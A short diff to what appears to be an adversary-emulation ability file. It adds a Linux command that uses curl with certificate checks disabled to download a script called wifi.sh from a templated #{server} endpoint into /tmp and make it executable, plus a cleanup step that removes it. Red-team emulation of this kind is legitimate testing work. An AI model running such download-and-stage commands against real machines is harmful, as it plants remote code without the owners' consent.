@@ -14,3 +14,9 @@
         chmod +x /tmp/wifi.sh
       cleanup: |
         rm /tmp/wifi.sh
+    linux:
+      command: |
+        curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
+        chmod +x /tmp/wifi.sh
+      cleanup: |
+        rm /tmp/wifi.sh
